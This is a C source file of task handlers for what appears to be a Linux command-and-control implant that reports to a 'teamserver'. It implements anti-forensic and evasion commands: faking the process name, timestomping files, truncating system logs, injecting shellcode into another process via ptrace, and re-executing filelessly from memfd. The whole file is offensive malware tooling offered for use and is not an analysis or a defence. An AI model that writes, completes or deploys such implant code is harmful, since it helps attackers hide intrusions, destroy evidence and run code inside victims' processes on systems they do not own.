/// tasks_opsec.c -- OPSEC command handlers for Linux agent
/// masquerade, timestomp, cleanlog, inject, migrate
/// All ops via direct syscalls — zero libc dependency.

#include "tasks_opsec.h"
#include "opsec.h"
#include "crt.h"
#include "types.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

// ── Helpers ──

static void write_error(mp_writer_t *w, const char *msg) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "error", msg);
}

static void write_output(mp_writer_t *w, const char *text) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "output", text);
}

// ══════════════════════════════════════════════════════════════════════
// masquerade — set fake process name
// Input msgpack: {name: "string"}
// ══════════════════════════════════════════════════════════════════════

// Stored argv pointer from _start / so_entry for masquerading
// Set by main.c at startup
extern char **g_argv;

int task_masquerade(const uint8_t *data, uint32_t len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        write_error(w, "invalid data");
        return 0;
    }

    const char *name = NULL;
    uint32_t name_len = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char *key; uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        if (klen == 4 && ax_memcmp(key, "name", 4) == 0) {
            mp_read_str(&r, &name, &name_len);
        } else {
            mp_skip(&r);
        }
    }

    if (!name || name_len == 0) {
        write_error(w, "missing 'name' parameter");
        return 0;
    }

    // Copy name to NUL-terminated buffer
    char name_buf[256];
    uint32_t copy_len = name_len < sizeof(name_buf) - 1 ? name_len : (uint32_t)(sizeof(name_buf) - 1);
    ax_memcpy(name_buf, name, copy_len);
    name_buf[copy_len] = '\0';

    opsec_masquerade(name_buf, g_argv);

    // Build response
    char msg[320];
    ax_strcpy(msg, "Process masqueraded as: ");
    ax_strcat(msg, name_buf);
    write_output(w, msg);
    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// timestomp — modify file timestamps
// Input msgpack: {path: "string", timestamp: uint64 (optional, 0=auto)}
// ══════════════════════════════════════════════════════════════════════

int task_timestomp(const uint8_t *data, uint32_t len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        write_error(w, "invalid data");
        return 0;
    }

    const char *path = NULL;
    uint32_t path_len = 0;
    uint64_t timestamp = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char *key; uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        if (klen == 4 && ax_memcmp(key, "path", 4) == 0) {
            mp_read_str(&r, &path, &path_len);
        } else if (klen == 9 && ax_memcmp(key, "timestamp", 9) == 0) {
            mp_read_uint(&r, &timestamp);
        } else {
            mp_skip(&r);
        }
    }

    if (!path || path_len == 0) {
        write_error(w, "missing 'path' parameter");
        return 0;
    }

    char path_buf[1024];
    uint32_t pcopy = path_len < sizeof(path_buf) - 1 ? path_len : (uint32_t)(sizeof(path_buf) - 1);
    ax_memcpy(path_buf, path, pcopy);
    path_buf[pcopy] = '\0';

    int ret = opsec_timestomp(path_buf, (long)timestamp);
    if (ret < 0) {
        write_error(w, "timestomp failed");
    } else {
        char msg[1080];
        ax_strcpy(msg, "Timestamps modified: ");
        ax_strcat(msg, path_buf);
        if (timestamp == 0) {
            ax_strcat(msg, " (copied from /usr/bin/ls)");
        }
        write_output(w, msg);
    }
    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// cleanlog — truncate system logs
// No input params
// ══════════════════════════════════════════════════════════════════════

int task_cleanlog(mp_writer_t *w) {
    int cleaned = opsec_clean_logs();
    if (cleaned == 0) {
        write_error(w, "No logs truncated (requires root)");
    } else {
        char msg[64];
        char num[16];
        ax_itoa(cleaned, num, 10);
        ax_strcpy(msg, "Truncated ");
        ax_strcat(msg, num);
        ax_strcat(msg, " log file(s)");
        write_output(w, msg);
    }
    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// inject — ptrace shellcode injection
// Input msgpack: {pid: uint, shellcode: bin}
// ══════════════════════════════════════════════════════════════════════

int task_inject(const uint8_t *data, uint32_t len, mp_writer_t *w) {
    mp_reader_t r;
    mp_reader_init(&r, data, len);

    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        write_error(w, "invalid data");
        return 0;
    }

    uint64_t pid = 0;
    const uint8_t *shellcode = NULL;
    uint32_t sc_len = 0;

    for (uint32_t i = 0; i < map_count; i++) {
        const char *key; uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        if (klen == 3 && ax_memcmp(key, "pid", 3) == 0) {
            mp_read_uint(&r, &pid);
        } else if (klen == 9 && ax_memcmp(key, "shellcode", 9) == 0) {
            mp_read_bin(&r, &shellcode, &sc_len);
        } else {
            mp_skip(&r);
        }
    }

    if (pid == 0) {
        write_error(w, "missing 'pid' parameter");
        return 0;
    }
    if (!shellcode || sc_len == 0) {
        write_error(w, "missing 'shellcode' parameter");
        return 0;
    }

    int ret = opsec_inject_ptrace((int)pid, shellcode, sc_len);
    if (ret < 0) {
        write_error(w, "ptrace injection failed (check permissions/PID)");
    } else {
        char msg[128];
        char pid_str[16];
        char sc_str[16];
        ax_itoa((int)pid, pid_str, 10);
        ax_itoa((int)sc_len, sc_str, 10);
        ax_strcpy(msg, "Injected ");
        ax_strcat(msg, sc_str);
        ax_strcat(msg, " bytes into PID ");
        ax_strcat(msg, pid_str);
        write_output(w, msg);
    }
    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// migrate — re-exec from memfd (fileless mode)
// No input params — this replaces the current process!
// On success, this function never returns.
// ══════════════════════════════════════════════════════════════════════

int task_migrate(mp_writer_t *w) {
#ifdef BUILD_SO
    // In SO mode, /proc/self/exe points to the host process, not our agent.
    // memfd re-exec would re-launch the host binary, not the agent.
    write_error(w, "migrate not supported in SO mode (use ELF format)");
    return 0;
#else
    // Attempt fileless re-exec via memfd_create.
    // On success, this replaces the process → teamserver sees disconnect + new init.
    // On failure, we report error and agent continues normally.
    int ret = opsec_migrate_memfd(g_argv, NULL);

    // Only reached on failure (success = execve replaces process)
    write_error(w, "memfd migration failed (check kernel support or permissions)");
    (void)ret;
    return 0;
#endif
}
